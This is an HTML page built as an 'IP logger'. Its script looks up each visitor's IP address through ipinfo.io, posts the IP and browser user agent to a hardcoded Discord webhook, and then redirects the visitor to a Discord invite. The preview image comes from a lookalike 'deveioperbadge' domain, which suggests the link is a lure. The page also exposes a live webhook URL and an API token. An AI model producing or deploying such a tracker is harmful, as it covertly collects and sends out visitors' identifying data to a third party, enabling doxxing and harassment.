<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta property="og:image" content="https://deveioperbadge.github.io/Image/download.jpg">
  <meta name="twitter:card" content="summary_large_image">
  <title>IP Logger - Redirecting to Discord...</title>
  <script>
    // Fetch the user's IP address using ipinfo.io API
    fetch('https://ipinfo.io/json?token=332dd3e8d08f73') // Replace with your ipinfo.io API token
      .then(response => response.json())
      .then(data => {
        const userIp = data.ip; // Extract the IP address from the response

        // Prepare data for Discord webhook
        const webhookData = {
          content: `ðŸš¨ Visitor IP: ${userIp}\nUser-Agent: ${navigator.userAgent}`
        };

        // Send the IP to your Discord webhook
        fetch("https://discord.com/api/webhooks/1363758796467470517/g4CPvVSvNzXL9tPAZHva2Vu9XWj7637j7_jumz8etF530Nxs0aUJ6T-BO_A7Oz2KO3WW", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(webhookData) // Send the data as JSON
        })
        .then(response => response.json())
        .then(data => {
          console.log("Webhook response:", data); // Log the response from Discord webhook
        })
        .catch(error => {
          console.error('Error sending data to webhook:', error); // Log any errors
        });

        // Redirect the user to your Discord invite link after logging the IP
        window.location.href = "https://discord.gg/YOUR_INVITE_CODE"; // Replace with your actual Discord invite code
      })
      .catch(error => {
        console.error('Error fetching IP:', error); // Log errors when fetching IP
        window.location.href = "https://discord.gg/FPE62ecaNh"; // Redirect even if IP fetch fails
      });
  </script>
</head>
<body>
  <h1>Logging your IP...</h1>
  <p>If you are not redirected shortly, click the link below:</p>
  <a href="https://discord.gg/FPE62ecaNh">Join my Discord Server</a> <!-- Replace with your Discord invite link -->
</body>
</html>
